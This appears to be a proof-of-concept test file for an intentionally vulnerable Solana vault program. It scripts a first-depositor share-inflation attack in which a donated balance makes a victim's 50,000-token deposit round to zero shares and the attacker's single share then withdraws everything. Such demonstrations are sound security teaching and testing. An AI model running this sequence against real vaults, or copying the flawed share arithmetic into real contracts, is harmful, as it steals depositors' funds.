/**
 * VULN 12 — Share inflation (first depositor + donation + rounding).
 *
 * The attacker becomes the first depositor (1 token -> 1 share), donates
 * tokens straight into the vault (inflating `total_assets` without minting
 * shares), and every subsequent depositor whose deposit is smaller than the
 * inflated balance receives 0 shares. Their tokens stay in the vault —
 * the attacker's single share then redeems the WHOLE balance.
 */
import { assert } from "chai";
import {
  PROG_IDS, provider, anchorProgram, findPda, seedsBuf, airdrop, newFundedKeypair,
  createMint, createAccount, mintTo, tokenBalance, BN,
} from "./util";

describe("vuln12 share inflation / depositor wipeout", () => {
  const program = anchorProgram("vuln12_inflation", PROG_IDS.vuln12);
  const vaultPda = findPda([seedsBuf("vault")[0]], PROG_IDS.vuln12)[0];
  const tokenVault = findPda([seedsBuf("token_vault")[0]], PROG_IDS.vuln12)[0];

  let mint: any, victim: any, attacker: any;
  let victimAta: any, attackerAta: any;
  let shareOf = (user: any) => findPda([seedsBuf("share")[0], user.publicKey.toBuffer()], PROG_IDS.vuln12)[0];

  before(async () => {
    await airdrop(provider.wallet.publicKey, 50);
    victim = await newFundedKeypair();
    attacker = await newFundedKeypair();

    mint = await createMint(provider.connection, provider.wallet.payer, provider.wallet.publicKey, null, 6);
    victimAta = await createAccount(provider.connection, provider.wallet.payer, mint, victim.publicKey);
    attackerAta = await createAccount(provider.connection, provider.wallet.payer, mint, attacker.publicKey);
    await mintTo(provider.connection, provider.wallet.payer, mint, victimAta, provider.wallet.publicKey, 100_000);
    await mintTo(provider.connection, provider.wallet.payer, mint, attackerAta, provider.wallet.publicKey, 100_000);

    await program.methods.initialize().accounts({ mint }).rpc();
    assert.equal((await tokenBalance(tokenVault)).toString(), "0");

    // 1) Attacker is the first depositor: 1 token -> 1 share.
    await program.methods.deposit(new BN(1))
      .accounts({ userShare: shareOf(attacker), vault: vaultPda, mint, user: attacker.publicKey, userAta: attackerAta })
      .signers([attacker]).rpc();

    // 2) Donation: 99_999 tokens into the vault WITHOUT shares being minted
    //    (a direct mint, same as transferring straight to the vault).
    await mintTo(provider.connection, provider.wallet.payer, mint, tokenVault, provider.wallet.publicKey, 99_999);
    assert.equal((await tokenBalance(tokenVault)).toString(), "100000");
  });

  it("victim deposits 50_000 and receives ZERO shares (rounds to 0)", async () => {
    // shares = 50_000 * 1 / 100_000 = 0
    await program.methods.deposit(new BN(50_000))
      .accounts({ userShare: shareOf(victim), vault: vaultPda, mint, user: victim.publicKey, userAta: victimAta })
      .signers([victim]).rpc();

    const share = await program.account.userShare.fetch(shareOf(victim));
    assert.equal(share.amount.toString(), "0");
    // ...but the tokens are already in the vault.
    assert.equal((await tokenBalance(tokenVault)).toString(), "150000");
    assert.equal((await tokenBalance(victimAta)).toString(), "50000");
  });

  it("attacker redeems 1 share -> the ENTIRE vault, victim gets nothing", async () => {
    await program.methods.withdraw(new BN(1))
      .accounts({
        userShare: shareOf(attacker), vault: vaultPda, mint,
        destinationAta: attackerAta, user: attacker.publicKey,
      })
      .signers([attacker]).rpc();

    // 99_999 (own tokens left after the 1-token deposit) + 150_000 (vault total,
    // including the victim's 50_000) — the victim's share is 0, so they got nothing.
    assert.equal((await tokenBalance(attackerAta)).toString(), "249999");
    assert.equal((await tokenBalance(tokenVault)).toString(), "0");

    const share = await program.account.userShare.fetch(shareOf(victim));
    assert.equal(share.amount.toString(), "0"); // nothing to redeem — 50_000 stolen
  });
});
